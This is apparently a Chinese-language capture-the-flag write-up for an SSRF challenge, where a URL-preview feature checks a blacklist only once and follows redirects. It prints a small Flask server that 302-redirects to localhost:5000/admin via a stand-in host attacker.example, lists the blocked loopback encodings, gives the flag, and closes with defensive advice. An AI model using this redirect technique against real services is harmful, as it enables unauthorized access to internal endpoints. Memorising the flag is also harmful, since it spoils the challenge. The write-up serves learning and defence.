# loopy

## 题目简述

网站预览功能对用户提交的 URL 做字符串黑名单检查，然后直接调用 `requests.get(url)`。`/admin` 只允许来源地址为 `127.0.0.1` 的请求。黑名单能拦住显式 localhost 地址，却没有在重定向后重新校验最终目的地，因此可用外部 302 跳转完成 SSRF。

## 解题过程

过滤集合包含 `127`、`local`、`2130706433`、`017700000001`、`::1`、`0.0.0.0`、`[::]` 和 `ffff`。但检查只执行一次：

```python
def fetch_preview(url):
    if not isSafe(url):
        return "Access denied"
    return requests.get(url)
```

Python Requests 默认跟随 HTTP 重定向。搭建一个可被题目服务器访问的外部页面，让它返回 `302 Location: http://localhost:5000/admin`：

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.get("/")
def index():
    return redirect("http://localhost:5000/admin", code=302)

app.run(host="0.0.0.0", port=8000)
```

把该服务通过自己的公网域名或临时转发入口暴露，例如 `https://attacker.example/`，再将这个不含黑名单词的初始 URL 提交给预览功能。服务端先访问外部地址，收到 302 后才访问 `localhost:5000/admin`；第二跳来自题目容器本身，所以 `request.remote_addr == '127.0.0.1'` 成立。预览结果中出现：

```text
tjctf{i_l0v3_ssssSsrF_9o4a8}
```

## 方法总结

- 核心技巧：用攻击者控制的 HTTP 重定向把安全的首跳 URL 转换为环回地址，绕过只检查初始字符串的 SSRF 黑名单。
- 识别信号：服务端 URL 抓取、`requests.get` 默认跟随跳转、内部路由按来源 IP 授权，以及校验与实际连接目标分离。
- 复用要点：每一跳都应解析并校验 scheme、规范化后的 IP 和 DNS 解析结果，禁用不必要的重定向，并防范 DNS rebinding 与 IPv4/IPv6 等价表示。
